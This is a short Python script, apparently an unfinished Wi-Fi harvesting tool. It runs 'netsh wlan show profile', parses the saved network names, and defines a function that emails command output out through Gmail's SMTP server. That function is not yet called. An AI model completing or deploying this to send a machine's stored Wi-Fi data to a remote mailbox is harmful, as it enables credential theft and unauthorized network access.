#!/usr/bin/env python3

import subprocess
import smtplib
import re

def send_main(email, password, message):
    """
    Executes system command, saves output to variable and emails output to email of choice.
    Server used for sending email: Google's server, as Google allows people to use their server to send emails.
    Note: Google's email server runs on port 587.

    :param email: str
    :param password: str
    :param message: str
    :return:
    """

    server = smtplib.SMTP("smtp.gmail.com", 587)  #create instance of SMTP server
    server.starttls()  #initiate TLS connection
    server.login(email, password)
    server.sendmail(email, email, message)  #send email to self
    server.quit()

if __name__ == "__main__":
    command = "netsh wlan show profile"
    networks = subprocess.check_output(command, shell=True)  #executes system command and saves return variable
    # network_names = re.findall(r"(?:.*Profile\s*:\s)(.*)(?:\\r\\n)", str(networks))
    print(str(networks))
    pattern = re.compile("(?:All User Profile\s*:\s*)([^\s]*)")
    print(f"\n{pattern}\n")
    network_names = pattern.findall(str(networks))
    
    print("\nNETWORK NAMES: ",network_names) 
    print(len(network_names))


